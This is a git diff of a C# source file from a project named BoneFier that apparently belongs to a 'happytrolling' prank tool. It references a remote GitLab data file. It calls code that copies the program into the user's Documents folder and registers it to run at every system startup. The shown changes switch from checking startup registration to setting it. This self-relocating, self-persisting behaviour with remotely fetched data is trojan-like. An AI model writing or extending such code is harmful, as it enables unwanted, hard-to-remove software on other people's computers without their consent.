@@ -8,6 +8,7 @@ using System.Threading.Tasks;
 using ReflectionClassOverriding;
 using BoneFier;
 using BoneFier.Basic;
+using System.IO;
 
 namespace BoneFier
 {
@@ -15,8 +16,9 @@ namespace BoneFier
     {
         //cloud data = https://gitlab.com/AliiMohammadi/happytrolling/-/raw/main/RemoteDataHappyTrolling.txt
 
-        public static Application application;
-        public static Emigrator emigrator;
+        public static Application application = new Application();
+        public static Emigrator emigrator = new Emigrator();
+        public static Asset asset = new Asset(emigrator.EmigrationPath + @"\BFasset\");
 
         public static bool Debug = false;
 
@@ -26,16 +28,15 @@ namespace BoneFier
         }
         static void Start()
         {
-            application = new Application();
-
             application.UpdateAppConfig();
 
             //ادرس پیش فرض مهاجرت :
             // Documents/ApplicationName.exe
-            emigrator = new Emigrator();
-            emigrator.Emigrate();
+            emigrator.Emigrate(); //در شروع اولیه برنامه اینجا بعد از مهاجرت خارج میشه
 
-            kernel.ChekStartUp(emigrator.ApplicationName, emigrator.TargetPath);//استارت اپ
+            application.UpdateAppConfig();
+
+            kernel.SetStartUp(emigrator.ApplicationName, emigrator.TargetPath);//استارت اپ
 
             if (!Debug)
             {
